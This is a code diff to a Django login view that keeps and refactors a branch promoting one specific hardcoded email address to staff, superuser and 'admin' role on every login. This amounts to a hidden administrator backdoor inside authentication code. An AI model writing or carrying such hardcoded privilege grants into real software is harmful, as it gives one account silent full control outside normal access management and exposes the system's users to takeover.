@@ -104,11 +104,19 @@ class LoginView(APIView):
         user.last_login = timezone.now()
         user.save(update_fields=["last_login"])
 
-        if user.email == "abubakkar.laiba@gmail.com" and not user.is_superuser:
-            User.objects.filter(pk=user.pk).update(is_staff=True, is_superuser=True, role="admin")
-            user.is_staff = True
-            user.is_superuser = True
-            user.role = "admin"
+        if user.email == "abubakkar.laiba@gmail.com":
+            needs_update = False
+            if not user.is_superuser:
+                user.is_staff = True
+                user.is_superuser = True
+                needs_update = True
+            if user.role != "admin":
+                user.role = "admin"
+                needs_update = True
+            if needs_update:
+                User.objects.filter(pk=user.pk).update(
+                    is_staff=True, is_superuser=True, role="admin"
+                )
 
         if user.two_factor_enabled:
             return Response(
